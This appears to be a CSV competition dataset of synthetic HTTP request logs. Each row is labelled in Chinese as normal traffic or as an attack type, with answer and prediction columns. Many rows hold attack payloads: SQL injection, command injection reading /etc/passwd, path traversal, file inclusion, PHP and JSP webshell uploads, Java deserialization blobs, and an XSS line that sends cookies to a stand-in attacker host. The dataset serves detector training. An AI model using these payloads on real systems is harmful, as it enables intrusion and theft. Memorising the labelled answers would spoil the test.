row_id,timestamp,user_agent,method,src_ip,dst_ip,url_path,request_body,attack_type(结果列，需参赛选手判断输出),attack_type_pred
4276,2025-11-03 09:19:31,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,PUT,192.168.6.186,10.234.72.203,/api/users,"{""product_id"":635,""quantity"":1}",正常访问,正常访问
3063,2025-11-11 03:35:01,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.187.69.60,10.187.67.184,/settings/568,"{""name"":""User4858"",""email"":""user1109@example.com"",""message"":""Hello""}",正常访问,正常访问
4816,2025-11-16 19:40:08,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,DELETE,192.168.21.4,10.251.99.250,/search/728,,正常访问,正常访问
4247,2025-10-21 22:38:11,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.11.156,10.251.99.238,/include,file%3Dphp://filter/read%3Dconvert.base64-encode/resource%3Dconfig282.php,文件包含攻击,文件包含攻击
10854,2025-11-04 16:30:54,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.210.196.4,10.244.155.144,/blog,q=query2170&category=books,正常访问,正常访问
8226,2025-11-07 04:31:04,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.250.132.22,10.244.155.153,/api/execute?domain=test610.com&&whoami&random=1890&cache=false,,远程命令执行攻击,远程命令执行攻击
6715,2025-10-27 09:46:35,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,192.168.18.61,10.251.227.41,/COntACT,CommeNT%3DThIs%2+0iS%20A%20gReat%+20prODuCT%207938,正常访问,正常访问
2051,2025-11-12 12:38:39,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,10.244.238.132,10.10.159.189,/register/962,"{""product_id"":910,""quantity"":7}",正常访问,正常访问
3919,2025-11-03 05:51:16,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.253.64.21,10.187.53.88,/process,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==76",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
7422,2025-10-19 06:15:57,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.250.15.15,10.210.184.42,/api/restore,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==808",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
9191,2025-10-22 09:22:16,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.253.110.37,10.187.76.33,/api/ping?q=hello285|cat /etc/passwd,,远程命令执行攻击,远程命令执行攻击
9631,2025-11-14 22:29:01,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,192.168.5.229,10.251.227.93,/viEW?dOcUment%3D../../../../WinDOws/sYSTeM32/drIvErs/ETc/hostS796&debug=1,,目录遍历攻击,目录遍历攻击
7564,2025-11-14 03:16:59,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.10.106,10.251.227.64,/include,theme=file:///etc/passwd810,文件包含攻击,文件包含攻击
9341,2025-11-07 20:20:23,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.250.84.66,10.244.155.144,/home,"{""name"":""User8426"",""email"":""user9117@example.com"",""message"":""Hello""}",正常访问,正常访问
6204,2025-10-23 03:28:19,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.168,/blog,page=11&limit=10&sort=name,正常访问,正常访问
3609,2025-10-30 23:09:52,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.251.204.24,10.210.184.39,/run?q=hello237|cat /etc/passwd,,远程命令执行攻击,远程命令执行攻击
4907,2025-11-10 19:21:38,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.108.208.231,10.253.251.75,/register?q=search,,正常访问,正常访问
4360,2025-11-08 15:36:30,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.21.82,10.251.10.26,/aPi/ordErs,,正常访问,正常访问
1402,2025-11-03 00:11:17,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.253.83.6,10.253.68.168,/search&random=6967&test=587,,正常访问,正常访问
8599,2025-11-09 03:05:20,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,DELETE,10.250.16.18,10.244.155.145,/api/orders,,正常访问,正常访问
9389,2025-11-07 12:27:43,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.250.132.22,10.244.155.153,/Api/REStOre,"RO0ABxnyadrTes5wyWNRywdlLk15q2Xhc3mAAAAAAAaAAQwaAHhwdweAHqACAaaaANNyAbfqYxZhlMxhbMCuUnVudgltzQAAAaaAaAAaAaAAbxZyABBqyXZHlmxhbMcUU3lzDgVtAaAAAaAaaAAAAABJKWN1CnJlBNRUaW1LTWLSbGlzsMf2YQBAb3JnLmfwywnozs5JB21TB25zLmNvBgxlY3Rp
b25zMS5CyXNOzu1hcAaaAAaAAaabWACIaavTyxB0aa9mAmF2yS91DgLsl01hCDt4chnYaBFQYXzHLNV0awwuSgfzaE1HCAUH2SHDFmdPAwADSqAKBg9HzEzHY3RvckKACXrOCmvzag9szhhWP0AaaAaaaAb3CAAaaBAaAAahDAajbXlPYmPlY3r0AAJbqnNyabdqyXzHLMxHbmCUU3RyAw5n063KkLjQyr4CaAFaAav2YWx1ZXhYaBbqYXZhLmxHbmcut2JqZWn0AaaaAAAaAAaaAAB4ChQABHRLc3r0AAr0cNvlEA%3D%3D278",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
9410,2025-11-09 12:15:07,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.250.16.18,10.244.155.145,/login,"{""username"":""user8383"",""password"":""secret9305""}",正常访问,正常访问
9695,2025-10-20 05:03:54,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,DELETE,10.251.216.121,10.210.184.38,/dashboard/196,,正常访问,正常访问
9375,2025-10-27 01:08:55,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.168,/EXeCUtE,TARgeT=1+27.0.0.1+325|`iD`,远程命令执行攻击,远程命令执行攻击
4957,2025-10-27 17:06:42,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.10.215,10.251.10.19,/include,file=expect://whoami,文件包含攻击,文件包含攻击
9326,2025-10-22 10:03:21,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.110.39,10.187.76.33,/dEserialize&timestamp=1763343515&test=400&random=531,"ro0ABXNyaBFQYXZhLnV0awWusgFZafNldJygou83gM6gaGABrgAkbG9HZeZhy3rVckkACXroCmvZaG9sZhHwp0aAAAAAAAx3CAAAABAAAAAHdAAKAMF2YS51DGlSlnnyABFqYXzhlmxHbmcUUnVuDGLTzQaaAAaAAAAAaaaABXzyAbBqyXzhLmxhbmCuu3lzdGVTaaAaAaAaAAaAaABJkWn1cnJLBnRUAW1LTWLsbgLzSMf2YQBAb3JNLmFWYWNoZs5jb21tB25ZLmNvbGxLY3rP
b25zMs5Db25zDGFUdE1HCaAAAAAaaAABwAciAAVtyXB0AA9MamF2YS91DgLSL01hcDT4chcIAaaaQaaAaaJzc+gARamF2yS5SYW5nLkluDgVnzXIS4qck94GhOAIAaUKabXZhBHVLEHIAEGpHdmeubgfUzy5ODW1IZXKGrJUdC5TgiwIAaHhWAAAAAXNYaBRqyXZHLNv0AWwuSGFzAE1HcAuH2SHdfmDPawADSQAkbg9HZEzhy3RvcKkAcxRocMVZaG9sZHHwP0AAaAaAaAb3CaaAaBAAaaaHdAAJbxlPyMpLy3r0AAjbQNnyAbdqYXzhLMxhbmcUU3RyAW5n063KkLjQyr4CAaFaaAV2ywX1ZXhyABBQYXzhLmxHbmcuT2JqZWN0AAaaAaAAAAAaaAB4chQABHrlC3R0aAR0cnVleA==143&timestamp=176333991+3",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
6646,2025-11-16 06:07:12,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.64.168,10.187.53.88,/lang&test=344&cache=false&cache=false,"template=data://text/plain;base64,+PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz+4=&debug=1&random=8729&random=8729",文件包含攻击,文件包含攻击
8214,2025-11-09 12:07:23,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.25.14.28,192.168.3.45,/update-profile,target_user=administrator&permission=admin,CSRF攻击,CSRF攻击
9667,2025-11-04 13:37:08,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.208.116.197,10.208.54.1,/api/download?file=../../../../etc/passwd957,,目录遍历攻击,目录遍历攻击
2175,2025-10-29 12:01:06,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.253.250.221,10.10.130.86,/file,dir=../../../../boot.ini866,目录遍历攻击,目录遍历攻击
4113,2025-11-14 04:09:38,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.21.117,10.52.79.208,/message,name=<svg/onload=alert&#x28;24&#x29;>,XSS跨站脚本攻击,XSS跨站脚本攻击
10284,2025-10-26 21:13:22,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,PUT,192.168.20.45,10.251.96.250,/dashboard/926,comment=This is a great product 917,正常访问,正常访问
8263,2025-11-17 04:36:57,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.210.44.96,10.244.155.171,/login?filter=active,,正常访问,正常访问
5646,2025-10-22 12:28:52,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.17.206,10.251.99.247,/api/products,"name=' UNION SELECT database(),user(),version()--",SQL注入攻击,SQL注入攻击
6141,2025-10-20 04:43:10,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.15.42,10.160.169.181,/about,"{""username"":""user9104"",+""password"":""secret3031""+}",正常访问,正常访问
10374,2025-11-15 10:12:13,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.253.83.6,10.253.68.169,/run&random=6415&cache=true,q%3Dhello918|c%27a%27t%20/etc/passwd&debug=1&test=239,远程命令执行攻击,远程命令执行攻击
6160,2025-11-06 17:57:31,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.8.95,10.251.227.51,/api/change-password,action=delete&confirm=true,CSRF攻击,CSRF攻击
5788,2025-11-11 09:28:14,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.17.241,192.168.0.100,/api/restore&timestamp=1763341671&test=991,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVt+AAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS9+1dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJ+bQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA%3D%3D46&random=5+675",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
2466,2025-11-16 00:58:46,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.6.36,10.240.181.222,/services,"{%22name%22:%22User8039%22,%22email%22:%22user5045@example.com%22,%22message%22:%22Hello%22}",正常访问,正常访问
2173,2025-10-25 07:04:33,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.253.250.220,10.10.130.86,/ping?address=127.0.0.1413; $(ls -la),,远程命令执行攻击,远程命令执行攻击
6120,2025-10-30 22:33:55,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.210.210.250,10.251.110.241,/APi/usErs,titLe%3dNeW%20POsT%209914%26cOnteNt%3Dpost%20COnTent%20HEre,正常访问,正常访问
4521,2025-11-10 08:12:17,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.26.157,110.210.194.68,/update-profile,new_password=hacked271&confirm_password=hacked22,CSRF攻击,CSRF攻击
3655,2025-10-19 21:32:34,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.187.19.235,10.253.177.26,/profile/60&test=297&cache=true&debug=0,product_id=439&quan+tity=8&timestamp=17+63345392&random=983+5,正常访问,正常访问
1308,2025-10-26 00:00:11,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,PUT,192.168.17.100,10.251.227.70,/search/223&random=4315&random=4315,"{%22product_id%22:626,%22quant+ity%22:2}&timestamp=1763344376",正常访问,正常访问
8763,2025-11-05 18:34:04,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.210.175.34,10.244.155.148,/run,target=127.0.0.1262|id,远程命令执行攻击,远程命令执行攻击
9771,2025-10-29 07:05:59,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.25.10.179,10.235.22.251,/Api/UPloAd&debug=0&test=686&test=686,"------WeBKiTFormBoundary573543
coNTEnt-DiSPosition:%20fORM-+dAtA;%20naME%3D%22file%22;%20fiLeNaME%3d%22sHELl275.php.jpg%+22
CoNTENT-TypE:%20ImAgE/Jpeg

%3C?php%20system($_GET[%27+CmD%27]);%20?%3E
------WebkiTformBoUndArY334003--&cache=fal+se",文件上传攻击,文件上传攻击
7498,2025-11-15 00:03:41,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.10.250,10.156.70.239,/ThEME?file%3DexPEct://whoaMi&cache=false&debug=0,,文件包含攻击,文件包含攻击
642,2025-10-15 04:20:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.25.130.249,10.235.192.117,/daSHBoaRd&test=1&debug=1&cache=false,,正常访问,正常访问
2319,2025-11-04 11:17:20,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.4.44,10.251.227.112,/deserialize,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==244",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
4208,2025-11-04 07:17:44,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.15.89,10.251.227.22,/search,"useRnAmE%3daDmin392%27%20UNION%20SeLeCT%20usernAme,pASsworD%20FroM%20admin_users--%26PaSsWOrd%3danytHInG",SQL注入攻击,SQL注入攻击
4137,2025-10-30 06:53:51,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.253.250.221,10.10.130.86,/run,target=127.0.0.136|ipconfig,远程命令执行攻击,远程命令执行攻击
738,2025-11-10 11:58:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.10.130.17,10.18.76.33,/dashboard?limit=10,,正常访问,正常访问
6773,2025-11-10 06:11:16,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.251.101.200,10.210.184.38,/post,content=<script>document.location='http://attacker207.com/steal.php?cookie='+document.cookie</script>,XSS跨站脚本攻击,XSS跨站脚本攻击
9993,2025-11-08 15:51:06,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.252.225.7,10.187.20.133,/api/products,title=New Post 8634&content=Post content here,正常访问,正常访问
3389,2025-11-16 18:07:38,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.252.168.242,10.16.210.9,/aPI/usErs,Page=84&LIMit=10&sorT=Name,正常访问,正常访问
9741,2025-11-09 07:43:25,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.10.133.31,10.235.176.65,/ApI/PAge?templAte=../../../../eTc/pasSwD13%00,,文件包含攻击,文件包含攻击
9681,2025-11-17 00:59:13,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.92.7,10.10.228.198,/upload,"------WebKitFormBoundary614693
Content-Disposition: form-data; name=""avatar""; filename=""backdoor751.php""
Content-Type: text/plain

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary795882--",文件上传攻击,文件上传攻击
7754,2025-11-07 11:18:28,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.210.5.44,10.244.155.148,/documents/upload,"------WebKitFormBoundary599366
Content-Disposition: form-data; name=""avatar""; filename=""backdoor153.jsp""
Content-Type: application/octet-stream

<% Runtime.getRuntime().exec(request.getParameter(""cmd"")); %>
------WebKitFormBoundary413801--",文件上传攻击,文件上传攻击
8787,2025-11-15 23:37:06,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.250.238.99,10.244.155.165,/page,page=http://malicious13.com/shell.txt,文件包含攻击,文件包含攻击
1083,2025-11-07 00:07:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.53.116.227,10.10.110.141,/search&random=422,page%3D1%26limit%3D10%26sort%3Dname&cache=false&timestamp=1762948282,正常访问,正常访问
2360,2025-10-28 20:28:03,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.251.10.118,10.210.184.39,/products,,正常访问,正常访问
9209,2025-11-15 15:55:36,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.250.167.155,10.244.155.145,/api/products?id=578 AND (SELECT LENGTH(user()))=22,,SQL注入攻击,SQL注入攻击
10983,2025-11-14 15:31:15,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,PUT,10.108.10.250,10.253.250.159,/products/17,comment=This is a great product 7277,正常访问,正常访问
1336,2025-11-12 21:51:37,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.7.21,10.240.84.20,/view&timestamp=1763342583&debug=0,path%3D../../../config/database599.yml+&timestamp=1763344630&test=982&test=98+2,目录遍历攻击,目录遍历攻击
8113,2025-10-18 08:48:58,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.25.14.28,192.168.2.16,/deserialize,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==205",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
4689,2025-11-08 08:53:38,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.11.161,10.251.10.246,/search,page=46&limit=10&sort=name,正常访问,正常访问
1838,2025-10-30 12:43:47,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.108.208.231,10.253.176.212,/users?username=admin620' OR '1'='1,,SQL注入攻击,SQL注入攻击
1444,2025-11-11 09:48:50,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.3.38,10.232.67.12,/file?load=../../../WEB-INF/web.xml20,,目录遍历攻击,目录遍历攻击
922,2025-10-22 00:39:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.25.189.55,10.10.130.86,/dAsHboard,,正常访问,正常访问
5790,2025-10-25 08:50:39,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.6.179,10.251.99.248,/UplOad,"------WEbKitfOrmboUndArY570891
CoNTenT-dIspOSITIOn:%20foRm-DaTA;%20nAme%3D%22FilE%22;%20filename%3d%22sHelL924.php.jPg%22
CoNTEnt-TYPe:%20imagE/Jpeg

%3c?PhP%20sySTEM($_GEt[%27cmd%27]);%20?%3E
------WeBKItFormBoundary301560--",文件上传攻击,文件上传攻击
7009,2025-11-15 16:05:25,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.187.19.210,10.253.177.28,/api/data,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==969",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
3663,2025-11-08 03:57:52,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.18.61,10.251.227.41,/api/products,id=887 AND (SELECT LENGTH(user()))=5,SQL注入攻击,SQL注入攻击
